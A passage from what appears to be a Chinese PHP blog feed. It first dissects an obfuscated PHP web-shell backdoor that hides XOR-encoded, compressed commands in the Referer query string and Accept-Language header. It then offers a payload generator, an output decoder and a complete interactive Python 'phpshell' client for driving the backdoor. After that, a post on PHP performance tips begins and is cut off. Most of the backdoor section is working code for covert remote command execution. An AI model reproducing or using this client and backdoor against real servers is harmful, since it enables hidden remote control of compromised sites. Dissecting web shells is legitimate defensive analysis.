<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$kh=<span class="string">&quot;4f7f&quot;</span>;</span><br><span class="line">$kf=<span class="string">&quot;28d7&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span> 循环异或加密解密，密钥 $k</span><br><span class="line">function <span class="keyword">x</span>($t,$k)&#123;</span><br><span class="line">    $c=strlen($k);</span><br><span class="line">    $l=strlen($t);</span><br><span class="line">    $o=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;$l;)&#123;</span><br><span class="line">        <span class="keyword">for</span>($j=<span class="number">0</span>;($j&lt;$c&amp;&amp;$i&lt;$l);$j++,$i++)&#123;</span><br><span class="line">            $o.=$t&#123;$i&#125;^$k&#123;$j&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $o;</span><br><span class="line">&#125;</span><br><span class="line">$r=$_SERVER;</span><br><span class="line">$rr=@$r[<span class="string">&quot;HTTP_REFERER&quot;</span>];</span><br><span class="line">$ra=@$r[<span class="string">&quot;HTTP_ACCEPT_LANGUAGE&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>($rr&amp;&amp;$ra)&#123;</span><br><span class="line">    <span class="regexp">//</span> 将 referer 的 query string 的 各个value取出到 $q</span><br><span class="line">    $u=parse_url($rr); <span class="regexp">//</span> parse referer, <span class="keyword">return</span> array, <span class="keyword">keys</span>: scheme,host,port,user,pass,path,query,fragment</span><br><span class="line">    parse_str($u[<span class="string">&quot;query&quot;</span>],$q); <span class="regexp">//</span> parse query string into $q (array).</span><br><span class="line">    $q=array_values($q);        <span class="regexp">//</span> array <span class="keyword">values</span> </span><br><span class="line"></span><br><span class="line">    // 分析 Accept-Language， 提取 每种语言的首字母和权重数字。</span><br><span class="line">    // Searches $ra <span class="keyword">for</span> all matches to the regular expression <span class="keyword">given</span> <span class="keyword">and</span> puts them in $m</span><br><span class="line">    preg_match_all(<span class="string">&quot;/([\w])[\w-]+(?:;q=0.([\d]))?,?/&quot;</span>,$ra,$m);</span><br><span class="line">    <span class="keyword">if</span>($q&amp;&amp;$m)&#123;</span><br><span class="line">        @session_start();</span><br><span class="line">        $s=&amp;$_SESSION;</span><br><span class="line">        $ss=<span class="string">&quot;substr&quot;</span>;</span><br><span class="line">        $sl=<span class="string">&quot;strtolower&quot;</span>;</span><br><span class="line">        $i=$m[<span class="number">1</span>][<span class="number">0</span>].$m[<span class="number">1</span>][<span class="number">1</span>];              <span class="regexp">//</span> 两组首字母</span><br><span class="line">        $h=$sl($ss(md5($i.$kh),<span class="number">0</span>,<span class="number">3</span>)); <span class="regexp">//</span> md5($i . $kh) 的前三个字符小写。攻击时附在 $p 开头</span><br><span class="line">        $f=$sl($ss(md5($i.$kf),<span class="number">0</span>,<span class="number">3</span>)); <span class="regexp">//</span> $p 是编码后Payload，攻击时附加到$p 后面</span><br><span class="line"></span><br><span class="line">        // 拼接Payload</span><br><span class="line">        $p=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span>($z=<span class="number">1</span>;$z&lt;count($m[<span class="number">1</span>]);$z++)  // 从$q 中取出 $m 正则匹配到的第<span class="number">2</span>组中索引 <span class="number">1</span> -- count($m[<span class="number">1</span>])-<span class="number">1</span> 的值(<span class="number">0</span>-<span class="number">9</span>)作为键的值连接，得到$p</span><br><span class="line">            $p.=$q[$m[<span class="number">2</span>][$z]];         <span class="regexp">//</span> 上例（language）, $p .= $q[<span class="number">8</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        // 去除 $p Payload 开头的 $h</span><br><span class="line">        <span class="keyword">if</span>(strpos($p,$h)===<span class="number">0</span>)&#123;        <span class="regexp">//</span> $h 在 $p[<span class="number">0</span>] 位置出现。</span><br><span class="line">            $s[$i]=<span class="string">&quot;&quot;</span>;        <span class="regexp">//</span> $_SESSION[$i] = <span class="string">&#x27;&#x27;</span>  , $i 是正则匹配到的两组首字母</span><br><span class="line">            $p=$ss($p,<span class="number">3</span>);    <span class="regexp">//</span> $p 从第<span class="number">3</span>个字符开始的子串,去掉 $h</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(array_key_exists($i,$s))&#123;         <span class="regexp">//</span> exist $s[$i], $_SESSION[$i] , <span class="keyword">if</span> 条件必须有 上文 $h 在 $p[<span class="number">0</span>] 位置出现</span><br><span class="line">            $s[$i].=$p;</span><br><span class="line">            $e=strpos($s[$i],$f);   <span class="regexp">//</span> $f 是md5 前三个字符小写 ，在 $s[$i]</span><br><span class="line">            <span class="keyword">if</span>($e)&#123;    <span class="regexp">//</span> 必须有 $f 作为<span class="string">&quot;停止字符串&quot;</span></span><br><span class="line">                $k=$kh.$kf; <span class="regexp">//</span> <span class="number">4</span>f7f28d7</span><br><span class="line">                ob_start();</span><br><span class="line">                <span class="regexp">/*</span></span><br><span class="line"><span class="regexp">                去除末尾的 $f</span></span><br><span class="line"><span class="regexp">                URL safe base64 还原为普通base64</span></span><br><span class="line"><span class="regexp">                base64 解码</span></span><br><span class="line"><span class="regexp">                循环异或解密</span></span><br><span class="line"><span class="regexp">                zlib 解密，还原出PHP代码</span></span><br><span class="line"><span class="regexp">                执行PHP代码</span></span><br><span class="line"><span class="regexp">                */</span></span><br><span class="line">                //@eval(@gzuncompress(@x(@base64_decode( preg_replace(array(<span class="string">&quot;/_/&quot;</span>,<span class="string">&quot;/-/&quot;</span>),array(<span class="string">&quot;/&quot;</span>,<span class="string">&quot;+&quot;</span>),$ss($s[$i],<span class="number">0</span>,$e)) ),$k)));</span><br><span class="line">                echo <span class="string">&quot;CMD WILL EXEC:\n&lt;br /&gt;&quot;</span>;</span><br><span class="line">                echo(@gzuncompress(@x(@base64_decode( preg_replace(array(<span class="string">&quot;/_/&quot;</span>,<span class="string">&quot;/-/&quot;</span>),array(<span class="string">&quot;/&quot;</span>,<span class="string">&quot;+&quot;</span>),$ss($s[$i],<span class="number">0</span>,$e)) ),$k)));</span><br><span class="line">                $o=ob_get_contents();  <span class="regexp">//</span> output</span><br><span class="line">                ob_end_clean();</span><br><span class="line">                $d=base64_encode(<span class="keyword">x</span>(gzcompress($o),$k));  <span class="regexp">//</span> 编码</span><br><span class="line">                <span class="keyword">print</span> $o;</span><br><span class="line">                <span class="regexp">//prin</span>t(<span class="string">&quot;&lt;$k&gt;$d&lt;/$k&gt;&quot;</span>);</span><br><span class="line">                @session_destroy();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>关于正则表达式，例子：</p>
<figure class="highlight smali"><table><tr><td class="code"><pre><span class="line">$ra = &#x27;zh-CN,zh;q=0.8,en;q=0.6&#x27;;</span><br><span class="line">$m =<span class="built_in"> array </span>(size=3)</span><br><span class="line">      0 =&gt; </span><br><span class="line">       <span class="built_in"> array </span>(size=3)</span><br><span class="line">          0 =&gt; string &#x27;zh-CN,&#x27; (length=6)</span><br><span class="line">          1 =&gt; string &#x27;zh;q=0.8,&#x27; (length=9)</span><br><span class="line">          2 =&gt; string &#x27;en;q=0.6&#x27; (length=8)</span><br><span class="line">      1 =&gt; </span><br><span class="line">       <span class="built_in"> array </span>(size=3)</span><br><span class="line">          0 =&gt; string &#x27;z&#x27; (length=1)</span><br><span class="line">          1 =&gt; string &#x27;z&#x27; (length=1)</span><br><span class="line">          2 =&gt; string &#x27;e&#x27; (length=1)</span><br><span class="line">      2 =&gt; </span><br><span class="line">       <span class="built_in"> array </span>(size=3)</span><br><span class="line">          0 =&gt; string &#x27;&#x27; (length=0)</span><br><span class="line">          1 =&gt; string &#x27;8&#x27; (length=1)</span><br><span class="line">          2 =&gt; string &#x27;6&#x27; (length=1)</span><br></pre></td></tr></table></figure>

<p>由此，理清这复杂的逻辑后可以写出以下 Payload 生成代码（PHP）：</p>
<p>(针对 zh-CN,zh;q&#x3D;0.8,en;q&#x3D;0.6 这一种 Accept-Language)</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$kh</span>=<span class="string">&quot;4f7f&quot;</span>;</span><br><span class="line"><span class="variable">$kf</span>=<span class="string">&quot;28d7&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$referer</span> = <span class="string">&#x27;http://example.com/?a=0&amp;b=1&amp;c=2&amp;d=3&amp;e=4&amp;f=5&amp;g=6&amp;h=7&amp;i=payloadhere&#x27;</span>;</span><br><span class="line"><span class="variable">$lang</span> = <span class="string">&#x27;zh-CN,zh;q=0.8,en;q=0.6&#x27;</span>;</span><br><span class="line"><span class="variable">$m</span> = <span class="keyword">array</span> (</span><br><span class="line">  <span class="number">0</span> =&gt;   <span class="keyword">array</span> (</span><br><span class="line">    <span class="number">0</span> =&gt; <span class="string">&#x27;zh-CN,&#x27;</span>,</span><br><span class="line">    <span class="number">1</span> =&gt; <span class="string">&#x27;zh;q=0.8,&#x27;</span>,</span><br><span class="line">    <span class="number">2</span> =&gt; <span class="string">&#x27;en;q=0.6&#x27;</span>,  ),</span><br><span class="line">  <span class="number">1</span> =&gt;   <span class="keyword">array</span> (</span><br><span class="line">    <span class="number">0</span> =&gt; <span class="string">&#x27;z&#x27;</span>,</span><br><span class="line">    <span class="number">1</span> =&gt; <span class="string">&#x27;z&#x27;</span>,</span><br><span class="line">    <span class="number">2</span> =&gt; <span class="string">&#x27;e&#x27;</span>,  ),</span><br><span class="line">  <span class="number">2</span> =&gt;   <span class="keyword">array</span> (</span><br><span class="line">    <span class="number">0</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="number">1</span> =&gt; <span class="string">&#x27;8&#x27;</span>,</span><br><span class="line">    <span class="number">2</span> =&gt; <span class="string">&#x27;6&#x27;</span>,  ),   );</span><br><span class="line"><span class="variable">$i</span> = <span class="string">&#x27;zz&#x27;</span>; <span class="comment">// $m[1][0] . $m[1][1]</span></span><br><span class="line"><span class="variable">$h</span>=<span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$i</span>.<span class="variable">$kh</span>),<span class="number">0</span>,<span class="number">3</span>)); <span class="comment">// 675</span></span><br><span class="line"><span class="variable">$f</span>=<span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$i</span>.<span class="variable">$kf</span>),<span class="number">0</span>,<span class="number">3</span>)); <span class="comment">// a3e</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"><span class="variable">$t</span>,<span class="variable">$k</span></span>)</span>&#123;        <span class="comment">// $k : xor key, $t: plain. loop xor encrypt $t.</span></span><br><span class="line">    <span class="variable">$c</span>=<span class="title function_ invoke__">strlen</span>(<span class="variable">$k</span>);</span><br><span class="line">    <span class="variable">$l</span>=<span class="title function_ invoke__">strlen</span>(<span class="variable">$t</span>);</span><br><span class="line">    <span class="variable">$o</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="variable">$l</span>;)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span>=<span class="number">0</span>;(<span class="variable">$j</span>&lt;<span class="variable">$c</span>&amp;&amp;<span class="variable">$i</span>&lt;<span class="variable">$l</span>);<span class="variable">$j</span>++,<span class="variable">$i</span>++)&#123;</span><br><span class="line">            <span class="variable">$o</span>.=<span class="variable">$t</span>&#123;<span class="variable">$i</span>&#125;^<span class="variable">$k</span>&#123;<span class="variable">$j</span>&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$o</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$key</span> = <span class="string">&#x27;4f7f28d7&#x27;</span>;</span><br><span class="line"><span class="comment">//$payload=&#x27;phpinfo();&#x27;;</span></span><br><span class="line"><span class="variable">$payload</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="variable">$payload</span> = <span class="title function_ invoke__">gzcompress</span>(<span class="variable">$payload</span>);</span><br><span class="line"><span class="variable">$payload</span> = <span class="title function_ invoke__">x</span>(<span class="variable">$payload</span>,<span class="variable">$key</span>);</span><br><span class="line"><span class="variable">$payload</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$payload</span>);</span><br><span class="line"><span class="variable">$payload</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;/\//&quot;</span>,<span class="string">&quot;/\+/&quot;</span>),<span class="keyword">array</span>(<span class="string">&quot;_&quot;</span>,<span class="string">&quot;-&quot;</span>), <span class="variable">$payload</span>);</span><br><span class="line"><span class="variable">$payload</span> = <span class="variable">$h</span> . <span class="variable">$payload</span> . <span class="variable">$f</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$payload</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&lt;br /&gt;\n&quot;</span>;</span><br><span class="line"><span class="variable">$referer</span> = <span class="string">&quot;http://example.com/?a=0&amp;b=1&amp;c=2&amp;d=3&amp;e=4&amp;f=5&amp;g=6&amp;h=7&amp;i=<span class="subst">$payload</span>&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$referer</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&lt;br /&gt;\n&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>对于 eval () 后的输出，有以下代码解密</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$kh</span>=<span class="string">&quot;4f7f&quot;</span>;</span><br><span class="line"><span class="variable">$kf</span>=<span class="string">&quot;28d7&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 循环异或，相同密钥 $k 既能加密也能解密</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"><span class="variable">$t</span>,<span class="variable">$k</span></span>)</span>&#123;        <span class="comment">// $k : xor key, $t: plain. loop xor encrypt $t.</span></span><br><span class="line">    <span class="variable">$c</span>=<span class="title function_ invoke__">strlen</span>(<span class="variable">$k</span>);</span><br><span class="line">    <span class="variable">$l</span>=<span class="title function_ invoke__">strlen</span>(<span class="variable">$t</span>);</span><br><span class="line">    <span class="variable">$o</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="variable">$l</span>;)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span>=<span class="number">0</span>;(<span class="variable">$j</span>&lt;<span class="variable">$c</span>&amp;&amp;<span class="variable">$i</span>&lt;<span class="variable">$l</span>);<span class="variable">$j</span>++,<span class="variable">$i</span>++)&#123;</span><br><span class="line">            <span class="variable">$o</span>.=<span class="variable">$t</span>&#123;<span class="variable">$i</span>&#125;^<span class="variable">$k</span>&#123;<span class="variable">$j</span>&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$o</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$k</span>=<span class="variable">$kh</span>.<span class="variable">$kf</span>; <span class="comment">// 4f7f28d7</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$output</span> = <span class="string">&#x27;TPocr/oUMjeWhOOCkOx2soCqqzIyf1IwLw==&#x27;</span>;</span><br><span class="line"><span class="variable">$o</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$output</span>);</span><br><span class="line"><span class="variable">$o</span> = <span class="title function_ invoke__">x</span>(<span class="variable">$o</span>,<span class="variable">$k</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">gzuncompress</span>(<span class="variable">$o</span>);</span><br></pre></td></tr></table></figure>

<p>根据这个后门的原理写了个交互式的利用程序（Python2）</p>
<p>每次执行代码生成一次 Accept-Language。对于 Referer 的 Query String，没有用到的部分用随机代码填充，编码后的 Payload 切成 3 部分，头部 md5 和主体连接起来从中切 2 份，尾部 md5 + 随机字符串作为第 3 份。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint,choice</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choicePart</span>(<span class="params">seq,amount</span>):</span><br><span class="line">    length = <span class="built_in">len</span>(seq)</span><br><span class="line">    <span class="keyword">if</span> length == <span class="number">0</span> <span class="keyword">or</span> length &lt; amount:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;Error Input&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    result = []</span><br><span class="line">    indexes = []</span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> count &lt; amount:</span><br><span class="line">        i = randint(<span class="number">0</span>,length-<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> i <span class="keyword">in</span> indexes:</span><br><span class="line">            indexes.append(i)</span><br><span class="line">            result.append(seq[i])</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> count == amount:</span><br><span class="line">                <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">randBytesFlow</span>(<span class="params">amount</span>):</span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(amount):</span><br><span class="line">        result += <span class="built_in">chr</span>(randint(<span class="number">0</span>,<span class="number">255</span>))</span><br><span class="line">    <span class="keyword">return</span>  result</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">randAlpha</span>(<span class="params">amount</span>):</span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(amount):</span><br><span class="line">        result += choice(string.ascii_letters)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">loopXor</span>(<span class="params">text,key</span>):</span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    lenKey = <span class="built_in">len</span>(key)</span><br><span class="line">    lenTxt = <span class="built_in">len</span>(text)</span><br><span class="line">    iTxt = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> iTxt &lt; lenTxt:</span><br><span class="line">        iKey = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> iTxt&lt;lenTxt <span class="keyword">and</span> iKey&lt;lenKey:</span><br><span class="line">            result += <span class="built_in">chr</span>(<span class="built_in">ord</span>(key[iKey]) ^ <span class="built_in">ord</span>(text[iTxt]))</span><br><span class="line">            iTxt += <span class="number">1</span></span><br><span class="line">            iKey += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debugPrint</span>(<span class="params">msg</span>):</span><br><span class="line">    <span class="keyword">if</span> debugging:</span><br><span class="line">        <span class="built_in">print</span> msg</span><br><span class="line"></span><br><span class="line"><span class="comment"># config</span></span><br><span class="line">debugging = <span class="literal">False</span></span><br><span class="line">keyh = <span class="string">&quot;4f7f&quot;</span> <span class="comment"># $kh</span></span><br><span class="line">keyf = <span class="string">&quot;28d7&quot;</span> <span class="comment"># $kf</span></span><br><span class="line">xorKey = keyh + keyf</span><br><span class="line">url = <span class="string">&#x27;http://example.com/backdoor.php&#x27;</span></span><br><span class="line">defaultLang = <span class="string">&#x27;zh-CN&#x27;</span></span><br><span class="line">languages = [<span class="string">&#x27;zh-TW;q=0.%d&#x27;</span>,<span class="string">&#x27;zh-HK;q=0.%d&#x27;</span>,<span class="string">&#x27;en-US;q=0.%d&#x27;</span>,<span class="string">&#x27;en;q=0.%d&#x27;</span>]</span><br><span class="line">proxies = <span class="literal">None</span> <span class="comment"># &#123;&#x27;http&#x27;:&#x27;http://127.0.0.1:8080&#x27;&#125; # proxy for debug</span></span><br><span class="line"></span><br><span class="line">sess = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="comment"># generate random Accept-Language only once each session</span></span><br><span class="line">langTmp = choicePart(languages,<span class="number">3</span>)</span><br><span class="line">indexes = <span class="built_in">sorted</span>(choicePart(<span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>),<span class="number">3</span>), reverse=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">acceptLang = [defaultLang]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">3</span>):</span><br><span class="line">    acceptLang.append(langTmp[i] % (indexes[i],))</span><br><span class="line">acceptLangStr = <span class="string">&#x27;,&#x27;</span>.join(acceptLang)</span><br><span class="line">debugPrint(acceptLangStr)</span><br><span class="line"></span><br><span class="line">init2Char = acceptLang[<span class="number">0</span>][<span class="number">0</span>] + acceptLang[<span class="number">1</span>][<span class="number">0</span>] <span class="comment"># $i</span></span><br><span class="line">md5head = (md5(init2Char + keyh).hexdigest())[<span class="number">0</span>:<span class="number">3</span>]</span><br><span class="line">md5tail = (md5(init2Char + keyf).hexdigest())[<span class="number">0</span>:<span class="number">3</span>] + randAlpha(randint(<span class="number">3</span>,<span class="number">8</span>))</span><br><span class="line">debugPrint(<span class="string">&#x27;$i is %s&#x27;</span> % (init2Char))</span><br><span class="line">debugPrint(<span class="string">&#x27;md5 head: %s&#x27;</span> % (md5head,))</span><br><span class="line">debugPrint(<span class="string">&#x27;md5 tail: %s&#x27;</span> % (md5tail,))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Interactive php shell</span></span><br><span class="line">cmd = raw_input(<span class="string">&#x27;phpshell &gt; &#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> cmd != <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">    <span class="comment"># build junk data in referer</span></span><br><span class="line">    query = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="built_in">max</span>(indexes)+<span class="number">1</span>+randint(<span class="number">0</span>,<span class="number">2</span>)):</span><br><span class="line">        key = randAlpha(randint(<span class="number">3</span>,<span class="number">6</span>))</span><br><span class="line">        value = base64.urlsafe_b64encode(randBytesFlow(randint(<span class="number">3</span>,<span class="number">12</span>)))</span><br><span class="line">        query.append((key, value))</span><br><span class="line">    debugPrint(<span class="string">&#x27;Before insert payload:&#x27;</span>)</span><br><span class="line">    debugPrint(query)</span><br><span class="line">    debugPrint(urllib.urlencode(query))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># encode payload</span></span><br><span class="line">    payload = zlib.compress(cmd)</span><br><span class="line">    payload = loopXor(payload,xorKey)</span><br><span class="line">    payload = base64.urlsafe_b64encode(payload)</span><br><span class="line">    payload = md5head + payload</span><br><span class="line"></span><br><span class="line">    <span class="comment"># cut payload, replace into referer</span></span><br><span class="line">    cutIndex = randint(<span class="number">2</span>,<span class="built_in">len</span>(payload)-<span class="number">3</span>)</span><br><span class="line">    payloadPieces = (payload[<span class="number">0</span>:cutIndex], payload[cutIndex:], md5tail)</span><br><span class="line">    iPiece = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> indexes:</span><br><span class="line">        query[i] = (query[i][<span class="number">0</span>],payloadPieces[iPiece])</span><br><span class="line">        iPiece += <span class="number">1</span></span><br><span class="line">    referer = url + <span class="string">&#x27;?&#x27;</span> + urllib.urlencode(query)</span><br><span class="line">    debugPrint(<span class="string">&#x27;After insert payload, referer is:&#x27;</span>)</span><br><span class="line">    debugPrint(query)</span><br><span class="line">    debugPrint(referer)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># send request</span></span><br><span class="line">    r = sess.get(url,headers=&#123;<span class="string">&#x27;Accept-Language&#x27;</span>:acceptLangStr,<span class="string">&#x27;Referer&#x27;</span>:referer&#125;,proxies=proxies)</span><br><span class="line">    html = r.text</span><br><span class="line">    debugPrint(html)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># process response</span></span><br><span class="line">    pattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;&lt;%s&gt;(.*)&lt;/%s&gt;&#x27;</span> % (xorKey,xorKey))</span><br><span class="line">    output = pattern.findall(html)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(output) == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;Error,  no backdoor response&#x27;</span></span><br><span class="line">        cmd = raw_input(<span class="string">&#x27;phpshell &gt; &#x27;</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    output = output[<span class="number">0</span>]</span><br><span class="line">    debugPrint(output)</span><br><span class="line">    output = output.decode(<span class="string">&#x27;base64&#x27;</span>)</span><br><span class="line">    output = loopXor(output,xorKey)</span><br><span class="line">    output = zlib.decompress(output)</span><br><span class="line">    <span class="built_in">print</span> output</span><br><span class="line">    cmd = raw_input(<span class="string">&#x27;phpshell &gt; &#x27;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="附注"><a href="#附注" class="headerlink" title="附注"></a>附注</h2><p>Accept-Language 解释</p>
<p>zh-cn,zh;q&#x3D;0.5</p>
<p>浏览器支持的语言分别是中文和简体中文，优先支持简体中文。</p>
<p>　　Accept-Language 表示浏览器所支持的语言类型；</p>
<p>　　zh-cn 表示简体中文；zh 表示中文；</p>
<p>　　q 是权重系数，范围 0 &#x3D;&lt;q &lt;&#x3D; 1，q 值越大，请求越倾向于获得其 “;” 之前的类型表示的内容，若没有指定 q 值，则默认为 1，若被赋值为 0，则用于提醒服务器哪些是浏览器不接受的内容类型。</p>
]]></content>
      <categories>
        <category>Php</category>
      </categories>
  </entry>
  <entry>
    <title>48条高效率的PHP优化写法</title>
    <url>/2018/06/php-performance/</url>
    <content><![CDATA[<h2 id="1-字符串"><a href="#1-字符串" class="headerlink" title="1 字符串"></a>1 字符串</h2><p><strong>1.1 少用正则表达式</strong></p>
<p>能用PHP<strong>内部字符串操作函数</strong>的情况下，尽量用他们，不要用正则表达式， 因为其效率高于正则。</p>
<span id="more"></span>

<p>没得说，正则最耗性能。</p>
<p><code>str_replace</code>函数要比<code>preg_replace</code>快得多，<code>strtr</code>函数又比<code>str_replace</code>来得快。</p>
<p>有没有你漏掉的好用的函数？</p>
<p>例如：<span class="exturl" data-url="aHR0cDovL3BocC5uZXQvbWFudWFsL3poL2Z1bmN0aW9uLnN0cnBicmsucGhw">strpbrk()<i class="fa fa-external-link-alt"></i></span>、<span class="exturl" data-url="aHR0cDovL3BocC5uZXQvbWFudWFsL3poL2Z1bmN0aW9uLnN0cm5jYXNlY21wLnBocA==">strncasecmp()<i class="fa fa-external-link-alt"></i></span>、<span class="exturl" data-url="aHR0cDovL3BocC5uZXQvbWFudWFsL3poL2Z1bmN0aW9uLnN0cnBvcy5waHA=">strpos()<i class="fa fa-external-link-alt"></i></span>、<span class="exturl" data-url="aHR0cDovL3BocC5uZXQvbWFudWFsL3poL2Z1bmN0aW9uLnN0cnJwb3MucGhw">strrpos()<i class="fa fa-external-link-alt"></i></span>、<span class="exturl" data-url="aHR0cDovL3BocC5uZXQvbWFudWFsL3poL2Z1bmN0aW9uLnN0cmlwb3MucGhw">stripos()<i class="fa fa-external-link-alt"></i></span>、<span class="exturl" data-url="aHR0cDovL3BocC5uZXQvbWFudWFsL3poL2Z1bmN0aW9uLnN0cnJpcG9zLnBocA==">strripos()<i class="fa fa-external-link-alt"></i></span>。</p>
<p><strong>1.2 字符替换</strong></p>
<p>如果需要转换的全是<strong>单个字符</strong>，用字符串作为 <span class="exturl" data-url="aHR0cDovL3BocC5uZXQvbWFudWFsL3poL2Z1bmN0aW9uLnN0cnRyLnBocA==">strtr()<i class="fa fa-external-link-alt"></i></span> 函数完成替换，而不是数组：</p>
<p>$addr &#x3D; strtr($addr, “abcd”, “efgh”);       &#x2F;&#x2F; 建议<br>$addr &#x3D; strtr($addr, array(‘a’ &#x3D;&gt; ‘e’, ));  &#x2F;&#x2F; 不建议</p>
<p>效率提升：10 倍。</p>
<p><code>str_replace</code>字符替换比正则替换<code>preg_replace</code>快，但<code>strtr</code>比<code>str_replace</code>又快<code>1/4</code>。</p>
<p>另外，不要做无谓的替换，即使没有替换，<code>str_replace</code>也会为其参数分配内存。很慢！</p>
<p>用 <code>strpos</code> 先查找（非常快），看是否需要替换，如果需要，再替换。</p>
<p>如果需要替换，效率几乎相等，差别在 <code>0.1%</code> 左右。</p>
<p>如果不需要替换：用 <code>strpos</code> 快 <code>200%</code>。</p>
<p><strong>1.3 压缩大的字符串</strong></p>
